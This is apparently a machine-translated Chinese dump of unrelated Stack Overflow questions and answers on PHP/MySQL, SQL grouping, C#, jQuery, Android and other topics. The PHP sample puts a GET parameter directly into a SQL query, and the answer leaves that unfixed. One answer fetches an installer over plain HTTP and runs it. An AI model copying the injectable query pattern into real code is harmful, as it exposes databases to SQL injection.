[本期](https://github.com/robbyrussell/oh-my-zsh/issues/1315)报告了同样的问题。

[您应该按照oh-my-zsh github 页面](https://github.com/robbyrussell/oh-my-zsh)（或[此处](https://github.com/robbyrussell/oh-my-zsh/issues/1315)）提供的手动安装步骤进行操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-02T17:21:30.470

通过手动运行`ohmyz.sh`脚本解决了问题：

```
rm -rf ~/.oh-my-zsh/
curl -L http://install.ohmyz.sh > install.sh
sh install.sh 
```

[资源](http://www.thinkingmedia.ca/2014/10/how-to-install-oh-my-zsh-on-ubuntu-14/)**

# css - CSS 3D 变换 - 获取变换元素的屏幕坐标

> ID：13313089
> 
> 赞同：2
> 
> 时间：2012-11-09T17:35:15.727
> 
> 标签：css, css-transforms

> **可能重复：**
> [如何获取 CSS3-3d 转换元素的屏幕位置？](https://stackoverflow.com/questions/8025622/how-to-get-screen-position-of-css3-3d-transformed-elements)

在玩 CSS 3D 变换时，我想获取变换元素的屏幕坐标（边界框的角） - 是否有提供此功能的 API？

如果没有直接的方法来获取它们，`matrix3d`如果我知道的话，我可以从当前计算它们。应用的变换通常看起来像

```
rotateY(40deg) translateZ(-450px) translateY(43.959403439996905px) 
```

这就是我阅读时返回的内容`element.style.webkitTransform`。但是，Chrome 开发工具中的 Computed Style 明确给出了它，例如

```
-webkit-transform: matrix3d(0.07660444431189782, 0, -0.06427876096865393, 0, 
0, 0.1, 0, 0, 0.6427876096865393, 0, 0.7660444431189781, 0, 
-252.8460175498463, 39.09830093383789, -222.5671108990365, 1); 
```

这让我认为，即使`transform`没有以这种方式指定，也可能只是在某个地方以编程方式获取整个矩阵。

这只是为了好玩和学习，所以任何特定于 Webkit/Chrome 的东西都可以。

# android - 我无法将数据从 Mysql 数据库检索到 Android 应用程序

> ID：13313093
> 
> 赞同：0
> 
> 时间：2012-11-09T17:35:26.620
> 
> 标签：android, mysql, database, json

我的应用程序尝试从 mysql 数据库中检索数据时遇到问题。当我运行应用程序时，我收到一条我在 php 代码中创建的消息，上面写着“找不到学生”。这是java代码：

```
 public class StudentEditAccount extends Activity {
    EditText txtsid;
    EditText txtfirstname;
    EditText txtlastname;
    EditText txtcoursecode;
    EditText txtphonenumber;
    EditText txtemail;

    Button btnSave;
    Button btnDelete;

    String sid;

    // Progress Dialog
    private ProgressDialog pDialog;

    // JSON parser class
    JSONParser jsonParser = new JSONParser();

    // single student url
    private static final String url_product_detials = "http://10.0.2.2/example/get_product_details.php";

    // url to update student
    private static final String url_update_product = "http://10.0.2.2/example/update_product.php";

    // url to delete student
    private static final String url_delete_product = "http://10.0.2.2/example/delete_product.php";

    // JSON Node names
    private static final String TAG_SUCCESS = "success";
    private static final String TAG_STUDENTS = "students";
    private static final String TAG_SID = "sid";
    private static final String TAG_FIRSTNAME = "firstname";
    private static final String TAG_LASTNAME = "lastname";
    private static final String TAG_COURSECODE = "coursecode";
    private static final String TAG_PHONENUMBER = "phonenumber";
    private static final String TAG_EMAIL = "email";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.studenteditaccount);

        // save button
        btnSave = (Button) findViewById(R.id.btnSave);
        btnDelete = (Button) findViewById(R.id.btnDelete);

        // getting student details from intent
        Intent i = getIntent();

        // getting student id (id) from intent
        sid = i.getStringExtra(TAG_SID);

        // Getting complete student details in background thread
        new GetStudentAccountDetails().execute();

        // save button click event
        btnSave.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                // starting background task to update student
                    new SaveStudentAccountDetails().execute();

            }
        });

        // Delete button click event
        btnDelete.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                // deleting student in background thread
                    new DeleteStudentAccount().execute();

            }
        });
    }

    /**
     * Background Async Task to Get complete student details
     * */
    class GetStudentAccountDetails extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(StudentEditAccount.this);
            pDialog.setMessage("Loading account details. Please wait...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

        /**
         * Getting student details in background thread
         * */
        protected String doInBackground(String... params) {

            // updating UI from Background Thread
            runOnUiThread(new Runnable() {
                public void run() {
                    // Check for success tag
                    int success;
                    try {
                        // Building Parameters
                        List<NameValuePair> params = new ArrayList<NameValuePair>();
                        params.add(new BasicNameValuePair("sid", sid));

                        // getting student details by making HTTP request
                        // Note that student details url will use GET request
                        JSONObject json = jsonParser.makeHttpRequest(
                                url_product_detials, "GET", params);

                        // check your log for json response
                        Log.d("Single student Details", json.toString());

                        // json success tag
                        success = json.getInt(TAG_SUCCESS);
                        if (success == 1) {
                            // successfully received student details
                            JSONArray studentsObj = json
                                    .getJSONArray(TAG_STUDENTS); // JSON Array

                            // get first student object from JSON Array
                            JSONObject students = studentsObj.getJSONObject(0);

                            // student with this sid found
                            // Edit Text
                            txtfirstname = (EditText) findViewById(R.id.inputfname);
                            txtlastname = (EditText) findViewById(R.id.inputlname);
                            txtcoursecode = (EditText) findViewById(R.id.inputcoursecode);
                            txtphonenumber = (EditText) findViewById(R.id.inputphonenumber);
                            txtemail = (EditText) findViewById(R.id.inputemail);

                            // display student data in EditText
                            txtfirstname.setText(students.getString(TAG_FIRSTNAME));
                            txtlastname.setText(students.getString(TAG_LASTNAME));
                            txtcoursecode.setText(students.getString(TAG_COURSECODE));
                            txtphonenumber.setText(students.getString(TAG_PHONENUMBER));
                            txtemail.setText(students.getString(TAG_EMAIL));

                        }else{
                            // student with sid not found
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            });

            return null;
        }

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String file_url) {
            // dismiss the dialog once got all details
            pDialog.dismiss();
        }
    }

    /**
     * Background Async Task to  Save student Details
     * */
    class SaveStudentAccountDetails extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(StudentEditAccount.this);
            pDialog.setMessage("Saving account ...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

        /**
         * Saving student
         * */
        protected String doInBackground(String... args) {

            // getting updated data from EditTexts
            String sid = txtsid.getText().toString();
            String firstname = txtfirstname.getText().toString();
            String lastname = txtlastname.getText().toString();
            String coursecode = txtcoursecode.getText().toString();
            String phonenumber = txtphonenumber.getText().toString();
            String email = txtemail.getText().toString();

            // Building Parameters
            List<NameValuePair> params = new ArrayList<NameValuePair>();
            params.add(new BasicNameValuePair(TAG_SID, sid));
            params.add(new BasicNameValuePair(TAG_FIRSTNAME, firstname));
            params.add(new BasicNameValuePair(TAG_LASTNAME, lastname));
            params.add(new BasicNameValuePair(TAG_COURSECODE, coursecode));
            params.add(new BasicNameValuePair(TAG_PHONENUMBER, phonenumber));
            params.add(new BasicNameValuePair(TAG_EMAIL, email));

            // sending modified data through http request
            // Notice that update student url accepts POST method
            JSONObject json = jsonParser.makeHttpRequest(url_update_product,
                    "POST", params);

            // check json success tag
            try {
                int success = json.getInt(TAG_SUCCESS);

                if (success == 1) {
                    // successfully updated
                    Intent i = getIntent();
                    // send result code 100 to notify about student update
                    setResult(100, i);
                    finish();
                } else {
                    // failed to update student
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String file_url) {
            // dismiss the dialog once student updated
            pDialog.dismiss();
        }
    }

    /*****************************************************************
     * Background Async Task to Delete Product
     * */
    class DeleteStudentAccount extends AsyncTask<String, String, String> {

        /**
         * Before starting background thread Show Progress Dialog
         * */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            pDialog = new ProgressDialog(StudentEditAccount.this);
            pDialog.setMessage("Deleting Account...");
            pDialog.setIndeterminate(false);
            pDialog.setCancelable(true);
            pDialog.show();
        }

        /**
         * Deleting student
         * */
        protected String doInBackground(String... args) {

            // Check for success tag
            int success;
            try {
                // Building Parameters
                List<NameValuePair> params = new ArrayList<NameValuePair>();
                params.add(new BasicNameValuePair("sid", sid));

                // getting student details by making HTTP request
                JSONObject json = jsonParser.makeHttpRequest(
                        url_delete_product, "POST", params);

                // check your log for json response
                Log.d("Delete student", json.toString());

                // json success tag
                success = json.getInt(TAG_SUCCESS);
                if (success == 1) {
                    // student successfully deleted
                    // notify previous activity by sending code 100
                    Intent i = getIntent();
                    // send result code 100 to notify about student deletion
                    setResult(100, i);
                    finish();
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

            return null;
        }

        /**
         * After completing background task Dismiss the progress dialog
         * **/
        protected void onPostExecute(String file_url) {
            // dismiss the dialog once student deleted
            pDialog.dismiss();

        }

    }
} 
```

这是PHP代码：

```
<?php

 // array for JSON response
$response = array();

// include db connect class
require_once __DIR__ . '/db_connect.php';

// connecting to db
$db = new DB_CONNECT();

// check for post data
if (isset($_GET["sid"])) {
    $sid = $_GET['sid'];

    // get a students from student table
    $result = mysql_query("SELECT *FROM student WHERE sid = $sid");

    if (!empty($result)) {
        // check for empty result
        if (mysql_num_rows($result) > 0) {

            $result = mysql_fetch_array($result);

            $students = array();
            $students["sid"] = $result["sid"];
            $students["firstname"] = $result["firstname"];
            $students["lastname"] = $result["lastname"];
            $students["coursecode"] = $result["coursecode"];
            $students["phonenumber"] = $result["phonenumber"];
            $students["email"] = $result["email"];
            // success
            $response["success"] = 1;

            // user node
            $response["students"] = array();

            array_push($response["students"], $students);

            // echoing JSON response
            echo json_encode($response);
        } else {
            // no student found
            $response["success"] = 0;
            $response["message"] = "No student found";

            // echo no users JSON
            echo json_encode($response);
        }
    } else {
        // no student found
        $response["success"] = 0;
        $response["message"] = "No student found";

        // echo no users JSON
        echo json_encode($response);
    }
} else {
    // required field is missing
    $response["success"] = 0;
    $response["message"] = "Required field(s) is missing";

    // echoing JSON response
    echo json_encode($response);
}
?> 
```

我的问题是：每次我尝试从 Mysql 数据库中检索数据时，导致应用程序显示消息“未找到学生”的问题是什么？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:53:02.747

SQL 查询中缺少空格。它应该是`SELECT * FROM student WHERE sid = $sid`

# sql - 具有空行的 SQL 分组

> ID：13313096
> 
> 赞同：2
> 
> 时间：2012-11-09T17:35:44.797
> 
> 标签：sql, sql-server, tsql, group-by

我搜索了一下，找不到任何可以解决我的确切问题的东西

我有一个表（MSSQL），数据如下所示：

```
Source table:

RID    FullName FirstName   LastName    Email               Address
-------------------------------------------------------------------------------
1      NULL     [BOB]       NULL        NULL                NULL
1      NULL     NULL        [BOB]       NULL                NULL
1      NULL     NULL        NULL        [bob@bob.com]       NULL
2      NULL     [JAY]       NULL        NULL                NULL
2      NULL     NULL        [JAY]       NULL                NULL
2      NULL     NULL        NULL        [jerry@jerry.com]   NULL
3      NULL     [RICK]      NULL        NULL                NULL
3      NULL     NULL        [RICK]      NULL                NULL
3      NULL     NULL        NULL        [rick@rick.com]     NULL 
```

但我需要将数据转换为如下所示：

```
Results table:

RID     FullName             Email                Address
---------------------------------------------------------
1       [BOB] [BOB]        [bob@bob.com]          NULL
2       [JAY] [JAY]        [jerry@jerry.com]      NULL
3       [RICK] [RICK]      [rick@rick.com]        NULL 
```

**注意：** 如果源表中的 Fullname 为 NULL，那么我们结合 FirstName 和 LastName。（如果 FirstName 和 LastName 都为 NULL，那么我们只会得到 NULL FullName 结果，这完全没问题）。

提前感谢您对此的任何帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-09T17:41:03.677

你需要一个`group by`：

```
select rid, coalesce(max(FullName), max(FirstName)+' '+max(LastName)) as FullName,
       max(Email) as Email,
       max(Address) as Address
from t
group by rid
order by 1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T17:40:20.687

这是一种方式，虽然有点复杂。我不知道您的完整数据集，但这*应该为您提供所有可能的组合，以防每个 RID 有多个条目*（例如，具有不同 FirstName 值的多行）。

```
SELECT a.RID, b.FirstName + ' ' + c.LastName AS FullName, d.Email
FROM myTable a
LEFT OUTER JOIN myTable b ON a.RID = b.RID AND b.FirstName IS NOT NULL
LEFT OUTER JOIN myTable c ON a.RID = c.RID AND c.LastName IS NOT NULL
LEFT OUTER JOIN myTable d ON a.RID = d.RID AND d.Email IS NOT NULL
GROUP BY a.RID, b.FirstName, c.LastName, d.Email 
```

[SQL 小提琴示例](http://www.sqlfiddle.com/#!3/77802/1)

# c# - 使用 DBGHELP 中的 SymSrvStoreFileW

> ID：13313100
> 
> 赞同：2
> 
> 时间：2012-11-09T17:36:00.020
> 
> 标签：c#, c++, interop, pinvoke

我正在尝试`SymSrvStoreFileW`从 DBGHELP.DLL 调用（在之前尝试`SymSrvGetFileIndexInfoW`开始工作失败之后）。重要功能在 MSDN 中定义如下：

```
BOOL WINAPI SymInitialize(
  _In_      HANDLE hProcess,
  _In_opt_  PCTSTR UserSearchPath, // null is documented as fine
  _In_      BOOL fInvadeProcess // false
);

PCTSTR WINAPI SymSrvStoreFile(
  _In_      HANDLE hProcess,
  _In_opt_  PCTSTR SrvPath, // e.g. "srv*C:\symbols"
  _In_      PCTSTR File, // e.g. "C:\myapp.pdb"
  _In_      DWORD Flags // I am using SYMSTOREOPT_RETURNINDEX (0x04)
);

BOOL WINAPI SymCleanup(
  _In_  HANDLE hProcess
); 
```

**hProcess**有点奇怪，从我收集[的文档](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681351.aspx)中可以看出，只要您保持一致，您传递给它的内容实际上并不重要。我同时使用了当前进程 ID 和“任何旧值”ID。都没有奏效。

我做了以下内容`externs`：

```
[DllImport("dbghelp.dll", EntryPoint = "SymInitializeW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
public static extern bool SymInitialize(
    IntPtr process,
    [param: MarshalAs(UnmanagedType.LPTStr)]
    string searchPath, 
    bool invadeProcess);

[DllImport("dbghelp.dll", EntryPoint = "SymCleanup", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
public static extern bool SymCleanup(IntPtr process);

[DllImport("dbghelp.dll", EntryPoint = "SymSrvStoreFileW", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
[return: MarshalAs(UnmanagedType.LPTStr)]
public static extern string SymSrvStoreFile(
    IntPtr process,
    [param: MarshalAs(UnmanagedType.LPTStr)]
    string srvPath,
    [param: MarshalAs(UnmanagedType.LPTStr)]
    string file,
    SymStoreOpt options);

enum SymStoreOpt : uint
{
    None = 0x00,
    Compress = 0x01,
    Overwrite = 0x02,
    Pointer = 0x08,
    ReturnIndex = 0x04,
    PassIfExists = 0x40,
} 
```

并尝试打电话：

```
var processId = IntPtr.Zero;
try
{
    // This succeeds.
    processId = new IntPtr(Process.GetCurrentProcess().Id);
    if (!NativeMethods.SymInitialize(processId, null, false))
    {
        processId = IntPtr.Zero;
        throw new Win32Exception(Marshal.GetLastWin32Error());
    }

    // This fails.
    var storageLocation = NativeMethods.SymSrvStoreFile(processId, "srv*C:\\vssym", "C:\\test\\mscorlib.pdb", SymStoreOpt.ReturnIndex);
    if (storageLocation == null)
    {
        // Errors under various circumstances.
        // - The operation completed successfully (but storageLocation is still null)
        // - The specified module could not be found
        throw new Win32Exception(Marshal.GetLastWin32Error());
    }
}
finally
{
    if (processId != IntPtr.Zero)
        NativeMethods.SymCleanup(processId);
} 
```

`extern`我的声明有错误吗？或者，任何人都知道如何获取 PDB/PE（而不仅仅是 .Net 的）的符号存储位置？我也尝试了其他`SymStoreOpt`标志，但一无所获。

在某些时候（我不记得我做了什么）文件出现在符号存储位置（即使`ReturnIndex`已使用），但那时我的进程会崩溃（其中一个调试器甚至没有捕获它） ，再次运行它会导致“操作成功”，没有返回值。

**编辑：** [我在 C++ 中尝试过这个](https://gist.github.com/ce87bd824654e84eb375)并且仍然得到相同的行为 - 显然我不想走那条路，因为 P/Invoke 具有架构中立的优势。

# java - Java 单选按钮提交

> ID：13313103
> 
> 赞同：0
> 
> 时间：2012-11-09T17:36:24.613
> 
> 标签：java, swing

您如何查看是否选择了按钮并将其用作二进制值

我有 3 个单选按钮，，，，`b1`它们都是独立的（不在 a 中`b2`），我需要当用户点击提交时，我可以将二进制值（如果按下则为 true，如果未按下则为 false）保存到变量中`b3``ButtonGroup`

```
//Gets details when submit is pressed
submit.addActionListener(new ActionListener()
{
    public void actionPerformed(ActionEvent e)
    {
        String name = t.getText();
        String surname = t1.getText();
        String studentID = t2.getText();
        //Code to place binary values into variables depending on the radio buttons selected
    }
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T18:07:10.280

如果您在谈论 a `JRadioButton`，您可以使用该`isSelected()`方法来了解用户是否检查过它。

```
String name = t.getText();
String surname = t1.getText();
String studentID = t2.getText();
boolean checked = myRadioButton.isSelected();
//... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T17:41:02.087

```
boolean button1 = b1.isSelected();
boolean button2 = b2.isSelected();
boolean button3 = b3.isSelected(); 
```

# php - Symfony 2 中的 jQuery 验证

> ID：13313112
> 
> 赞同：4
> 
> 时间：2012-11-09T17:37:00.483
> 
> 标签：php, javascript, jquery, validation, symfony

我试图长时间对我的 symfony 2 项目进行 jquery 验证。它适用于默认消息。但无法到达那里自定义消息。输入名称有问题。当我尝试这样的事情时：

```
rules: {
   xxx_backbundle_offerstype[title]: "required"
},messages: {
   xxx_backbundle_offerstype[title]: "This field is required"
} 
```

我收到此错误“id 后缺少运算符”。我认为，这是 JS 错误，但我不知道如何解决它。是否真的可以使用 jquery 验证 inf symfony。

谢谢你的任何提示

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-09T18:21:16.097

试试下面，使用单引号

```
rules: {
   'xxx_backbundle_offerstype[title]': "required"
},messages: {
   'xxx_backbundle_offerstype[title]': "This field is required"
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-03-14T02:45:39.590

如果你在 HTML 中嵌入你的 JavaScript，你可以这样做（至少我是这样做的）：

```
rules: {
    '{{ form.foo.vars.full_name }}': 'required'
},
messages: {
    '{{ form.foo.vars.full_name }}': 'This field is required!'
} 
```

通过这样做，您不必在更新表单项的名称时更新脚本。

# c# - 我应该在更新之前检查自定义对象是否脏吗

> ID：13313113
> 
> 赞同：0
> 
> 时间：2012-11-09T17:37:01.830
> 
> 标签：c#, asp.net

所以我今天想知道这个。在更新对象之前，真的有必要检查我的自定义对象是否脏吗？我看待它的方式是，检查和设置对象的脏状态只是服务器必须进行的更多调用，而不是对数据库进行一次调用。如果对象没有改变，那么什么都不会改变，但我仍然会有关于 lastupdated 和 lastupdatedby 的信息来看看有人这样做了。其他人对此有何看法？这只是个人喜好问题吗？

# python - Appengine 搜索 API - 全球一致

> ID：13313118
> 
> 赞同：0
> 
> 时间：2012-11-09T17:37:12.817
> 
> 标签：python, google-app-engine, full-text-search, gae-search

我一直在使用 appengine python 实验 searchAPI。它工作得很好。在 1.7.3 版中，我更新了所有不推荐使用的方法。但是，我现在收到此警告：

DeprecationWarning：不推荐使用一致性。GLOBALLY_CONSIST

但是，我不确定如何在我的代码中解决它。谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T20:35:41.753

这取决于您是否有任何全局一致的索引。如果你这样做了，那么你应该将所有数据从这些索引迁移到新的、每个文档一致的（这是默认的）索引。去做这个：

*   循环遍历您存储在全局索引中的文档并在新索引中重新索引它们。
*   将引用从全局索引更改为新的每文档索引。
*   确保一切正常，然后从全局索引中删除文档（完成迁移不是必需的，但仍然是个好主意）。

然后，您应该从代码中删除任何提及一致性的内容；默认是每个文档一致的，最终我们将完全取消指定一致性的能力。

如果您在全局一致索引中没有任何数据，您可能会收到警告，因为您指定了一致性。如果您停止指定一致性，它应该会消失。

请注意，Python API 存在一个已知问题，该问题会导致大量关于一致性的错误弃用警告，因此您也可能会看到这一点。该问题将在下一个版本中修复。

# jquery - 将 jquery editInPlace 插件应用于 FancyBox iframe

> ID：13313126
> 
> 赞同：0
> 
> 时间：2012-11-09T17:37:33.097
> 
> 标签：jquery, jquery-plugins, iframe, fancybox

我目前正在使用 FancyBox 启动带有文本的 iframe。我想使用 jquery 的 editInPlace 插件来允许用户编辑 iframe 中的文本。这都在同一个域上，在一个 Intranet 中。

这是我如何调用我的 iframe：

```
<a class="read_more fancybox.iframe" href="iframe.html" data-id="01/01/2012" title="Mgmt Approvals Required" >Read more</a> 
```

fancybox iFrame 加载正常，文本被读入。这是我尝试调用 editInPlace 插件的方式：

```
 $(".fancybox.iframe").contents().find('#edittext').html(
        $('#edittext').editInPlace({
            callback: function(unused, enteredText) { return enteredText; },
            // url: './server.php',
            show_buttons: true
        })
    ); 
```

但没有运气。知道我应该如何调用 editInPlace 代码吗？

这是 iframe.html - 非常基本：

```
 <!DOCTYPE html>
<html>
<head>
    <title>Mgmt Approval</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />       
</head>
<body>

<h1>Management Approval Required</h1>
    <div id = "edittext">
    <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam scelerisque justo ac eros consectetur bibendum. In hac habitasse platea dictumst. Nulla aliquam turpis et tellus elementum luctus. Duis sit amet rhoncus velit. Duis nisl ligula, mattis interdum blandit laoreet, mattis id ante. Cras pulvinar lacus vitae nisi egestas non euismod neque bibendum. Vestibulum faucibus libero id ante molestie ultricies. Vestibulum quis nibh felis. Vestibulum libero nisl, vehicula vel ullamcorper sit amet, tristique sit amet augue. Etiam urna neque, porttitor sed sodales lacinia, posuere a nisl. Vestibulum blandit neque in sapien volutpat ac condimentum sapien auctor. Ut imperdiet venenatis ultricies. Phasellus accumsan, sem eu placerat commodo, felis purus commodo ipsum, sit amet vulputate orci est viverra est.
    </p>
    </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T22:18:51.910

我猜这个：

```
$(".fancybox.iframe").contents().find ..... 
```

...应该 ：

```
$(".fancybox-iframe").contents().find ..... 
```

`.fancybox.iframe`是您从中触发 fancybox 的选择器的*类，而不是 fancybox*`iframe` *类*

**注意**：这是为 fancybox v2.x 准备的。...如果使用 v1.3.4，那么选择器是`#fancybox-iframe`

另一方面，如果你已经找到了选择器，`#edittext`那么你就不需要这个`.html()`方法了：

```
$(".fancybox-iframe").contents().find('#edittext').editInPlace({
   callback: function(unused, enteredText) { return enteredText; },
   // url: './server.php',
   show_buttons: true
 }); // editInPlace 
```

**更新**（2012 年 11 月 13 日）：在您的帖子中，您说`The fancybox iFrame loads fine and the text is read in`所以我假设您的代码中只有一部分引用了错误的选择器，但我想我应该更具体一点，并说您必须在fancybox中调用*editInPlace*插件`afterShow`回调......所以完整的代码应该看起来像

```
$(document).ready(function() {
 $(".read_more").fancybox({
   width: "70%", // or whatever
   height: 400,
   fitToView: false,
   autoSize : false,
   afterShow : function(){
    $(".fancybox-iframe").contents().find('#edittext').editInPlace({
       callback: function(unused, enteredText) { return enteredText; },
       // url: "./server.php",
       show_buttons: true
    }); // editInPlace
   } // afterShow
 }); // fancybox
}); // ready 
```

这应该对fancybox v2.1.3 有用

**[看演示](http://www.picssel.com/playground/jquery/editInPlace_fancybox_13nov12.html)**

# vb.net - 如何使用 vb.net 隐藏 http 请求

> ID：13313127
> 
> 赞同：1
> 
> 时间：2012-11-09T17:37:33.413
> 
> 标签：vb.net, httpwebrequest

我正在开发新的应用程序。这是应用程序需要从我的网站获取信息，因此我使用 vb.net 使用 HTTP 请求。

```
Sub Main()
'Address of URL
Dim URL As String = http://whatever.com
' Get HTML data
Dim client As WebClient = New WebClient()
Dim data As Stream = client.OpenRead(URL)
Dim reader As StreamReader = New StreamReader(data)
Dim str As String = ""
str = reader.ReadLine()
Do While str.Length > 0
    Console.WriteLine(str)
    str = reader.ReadLine()
Loop 
```

我的问题是，我找到了一个名为 fiddler [http://www.fiddler2.com/fiddler2/的应用程序](http://www.fiddler2.com/fiddler2)

这个应用程序可以找到使用我的应用程序发出的所有 HTTP 请求，因此这使我的网站处于***危险之中***。

**有什么方法可以隐藏 HTTP 请求不被检测到？？？？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-09T18:16:08.270

我不熟悉这个“提琴手”产品，但仅从阅读您引用的页面来看，它是在用户机器上运行并监控该计算机与 Internet 之间的流量的东西。我看不出在理论上如何防止这种情况发生。信号在离开用户计算机的电线上移动。他大概可以物理访问自己的计算机。如果不出意外，他可以在从计算机背面引出的电缆上连接一些东西，以监控通过电线传输的信号。

您可以对消息进行加密，使用户难以理解它们的含义，但您不能阻止他在发送消息时阅读该消息。

顺便说一句，我想知道用户知道从他自己的计算机发送什么消息是一个安全问题。您是否试图向使用您的程序的人隐藏您正在做的事情？坦率地说，如果我发现我电脑上的某个应用程序试图向我隐藏它在做什么，我会立即删除它。为什么有人要隐藏他对我的电脑所做的事情，除非他所做的事情是险恶的，试图窃取我的个人数据或类似的事情？

稍微讽刺一下，你的问题听起来有点像在问，当我拜访一位商业伙伴时，我怎样才能阻止他在他走出几分钟时发现我在他的办公室里做了什么？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-03-21T20:20:12.340

有一种使用代理方法的方法，只需在 HTTP 请求中添加此代码：

Request.Proxy = 新的 WebProxy()

导致提琴手如何工作它使用上面的代码将自己设置为代理它无法设置提琴手代理，这就是你如何阻止它读取任何内容

# shell - 我想引用一个用 shell 创建的新 excel 对象

> ID：13313129
> 
> 赞同：0
> 
> 时间：2012-11-09T17:37:38.553
> 
> 标签：shell, excel, vba

我的机器上有 Excel 2003 和 2010，所以当我使用`set xlapp = new excel.application`它时会创建一个新的 Excel 2003 应用程序。我的解决方法是使用 shell 创建一个新的 Excel 14 应用程序。它可以工作，但我需要打开一个现有的 excel 文件以稍后引用该对象。

我想在不打开现有文件的情况下引用该对象。有什么方法可以在不使用文件名的情况下引用新的 Excel 应用程序。下面是现有文件的代码。请告诉我正确的方法来做到这一点。

```
Dim MyApp As Excel.Application
TaskID = Shell("C:\Program Files\Microsoft Office\Office14\EXCEL.EXE  "C:\Book2.xlsx", vbNormalFocus)
Set MyApp = GetObject("C:\Book2.xlsx").Application 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T17:43:11.620

您可以创建它并关闭 Excel ...

```
strFileName = "c:\test.xls"

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = True ' You don't have to use this property....

Set objWorkbook = objExcel.Workbooks.Add()
objWorkbook.SaveAs(strFileName)

objExcel.Quit 
```

这对你有用吗？请参阅此处原始解决方案：[使用 vbscripts 创建 Excel 文件](https://stackoverflow.com/questions/1123605/create-an-excel-file-using-vbscripts)

# c# - 包含三元条件运算的布尔或不会短路

> ID：13313135
> 
> 赞同：-1
> 
> 时间：2012-11-09T17:37:53.587
> 
> 标签：c#, .net, short-circuiting

一般来说，短路`or`算子`||`会忽略 的右侧，或者如果左侧的计算结果为真。显然，我们发现了一个例外。

查看以下内容：

```
if (foo == null || bar != true ? foo.Count == 0 : true)
{

} 
```

此代码在命令上引发空引用异常，`foo.Count`因为`foo`为空。当然，布尔逻辑允许这样做。但是，如果`foo`为 null，您会期望它`or`会短路，甚至不会评估表达式的右侧，但它仍然会发生，并且会引发异常。

这是我的代码或 C# 编译器中的错误吗？是否有处理这种情况的 C# 规范的一部分？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-09T17:40:27.003

那是因为您的陈述没有按照您的预期进行评估。

你需要一些额外的括号：

```
if(foo == null || (bar != true ? foo.Count == 0 : true)) 
```

现在的写法等价于（由于运算符优先级）：

```
if((foo == null || bar != true) ? foo.Count == 0 : true) 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-11-09T17:40:42.047

不，它可以正常工作，请参阅[运算符优先级](http://msdn.microsoft.com/en-us/library/aa691323%28v=vs.71%29.aspx)。`||`将在之前进行评估`?:`

所以它首先评估`foo == null || bar != true`然后`? foo.Count == 0 : true`，所以它更像是：

```
if ((foo == null || bar != true) ? foo.Count == 0 : true)
{

} 
```

如果你想在这里使用短路，那么它应该是：

```
if (foo == null || (bar != true ? foo.Count == 0 : true))
{

} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-09T17:41:27.387

想象一下您正在检查的条件周围的括号：

```
if ((foo == null || bar != true) ? foo.Count == 0 : true)
{

} 
```

因此，如果`foo`is `null`，您正在尝试读取`foo.Count`，这自然会导致`NullReferenceException`.

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-09T17:46:42.430

根据[运算符优先级和关联](http://msdn.microsoft.com/en-us/library/aa691323%28v=vs.71%29.aspx)性，条件运算符`?:`的优先级最低。因此它将最后执行。像这样：

```
(foo == null || bar != true) ? foo.Count == 0 : true 
```

# android - 动态增加 TextView TextSize 10%

> ID：13313138
> 
> 赞同：2
> 
> 时间：2012-11-09T17:38:11.143
> 
> 标签：android, textview, scale

有人会认为这会将文本大小增加 10%：

```
view.setTextSize( (float) (view.getTextSize() * 1.1) ); 
```

但不幸的是，`get`and`set`调用以**不同的规模运行！**

在 Galaxy Nexus（手机）上检查一下：

```
float a = view.getTextSize();  // a = 44.0
view.setTextSize(a);
float b = view.getTextSize();  // b = 88.0 
```

在 Nexus7（平板电脑）上：

```
float a = view.getTextSize();  // a = 44.0
view.setTextSize(a);
float b = view.getTextSize();  // b = 58.6 
```

该`set`呼叫将我给它的数字缩放为任意数字。

我尝试调用`getScaleX()`并`getTextScaleX()`查看是否可以检索比例值并解释它，但是这两个调用总是返回`1.0`

* * *

